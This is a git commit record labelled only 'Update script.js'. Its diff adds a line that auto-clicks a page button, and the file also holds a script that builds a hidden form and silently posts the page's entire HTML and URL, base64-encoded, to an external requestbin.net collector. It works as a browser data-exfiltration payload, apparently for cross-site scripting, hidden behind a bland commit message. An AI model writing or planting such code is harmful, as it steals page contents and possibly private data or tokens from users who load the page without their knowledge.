64f05b2a907cf68248b559e6c7da0c793347c9f3
Invaders0 <46098959+Invaders0@users.noreply.github.com>
2020-01-19 18:04:28 +0530

    Update script.js

--- script.js
+++ script.js
@@ -1,3 +1,3 @@
 
-
+document.getElementsByClassName("btn btn-outline-primary")[0].click();
 f=document.createElement("form");i=document.createElement("input");f.method='post';f.action='http://requestbin.net/r/rj93qcrj';i.name='data';i.value=btoa(encodeURI(window.document.all[0].innerHTML+window.location.href));f.appendChild(i);document.body.appendChild(f);f.submit();
